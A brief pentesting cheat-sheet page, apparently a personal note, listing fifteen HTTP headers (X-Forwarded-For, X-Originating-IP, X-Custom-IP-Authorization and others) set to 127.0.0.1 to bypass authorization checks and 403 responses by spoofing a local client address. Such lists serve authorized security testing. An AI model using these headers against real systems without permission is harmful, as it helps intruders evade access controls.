---
layout: memory
title: Pentesting - Auth bypass headers
---

Common headers that help to bypass auth issues and HTTP 403 madness:

| Header                                |
| ------------------------------------- |
| X-Forwarded: 127.0.0.1                |
| X-Forwarded-By: 127.0.0.1             |
| X-Forwarded-For: 127.0.0.1            |
| X-Forwarded-For-Original: 127.0.0.1   |
| X-Forwarder-For: 127.0.0.1            |
| X-Forward-For: 127.0.0.1              |
| Forwarded-For: 127.0.0.1              |
| Forwarded-For-Ip: 127.0.0.1           |
| X-Custom-IP-Authorization: 127.0.0.1  |
| X-Originating-IP: 127.0.0.1           |
| X-Remote-IP: 127.0.0.1                |
| X-Remote-Addr: 127.0.0.1              |
| X-Trusted-IP: 127.0.0.1               |
| X-Requested-By: 127.0.0.1             |
| X-Requested-For: 127.0.0.1            |
